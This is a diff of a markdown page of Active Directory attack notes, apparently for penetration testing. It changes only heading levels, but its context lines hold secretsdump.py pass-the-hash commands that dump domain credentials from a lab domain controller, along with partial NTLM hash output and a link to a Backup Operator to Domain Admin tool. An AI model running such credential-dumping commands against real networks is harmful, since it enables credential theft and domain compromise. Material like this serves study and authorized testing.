@@ -103,7 +103,7 @@ $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1842947e54ab3d9a8758531e8fc6049
 
 ### Dump everything
 
-#### Using administrator hash
+### Using administrator hash
 
 ```plain
 $ secretsdump.py offsec.nl/administrator@srv2019.offsec.nl -hashes :97f2592347d8fbe42be381726ff9ea83 -just-dc
@@ -123,7 +123,7 @@ offsec.nl\ULYSSES_COTE:1108:aad3b435b51404eeaad3b435b51404ee:c7f0cab839fde136be0
 [...]
 ```
 
-#### Using machine account hash
+### Using machine account hash
 
 ```plain
 $ secretsdump.py offsec.nl/'srv2019$'@srv2019.offsec.nl -hashes :e1842947e54ab3d9a8758531e8fc6049 -just-dc
@@ -143,6 +143,6 @@ offsec.nl\ULYSSES_COTE:1108:aad3b435b51404eeaad3b435b51404ee:c7f0cab839fde136be0
 [...]
 ```
 
-### URL list
+## URL List
 
 * [Github.com - From Backup Operator To Domain Admin](https://github.com/mpgn/BackupOperatorToDA)
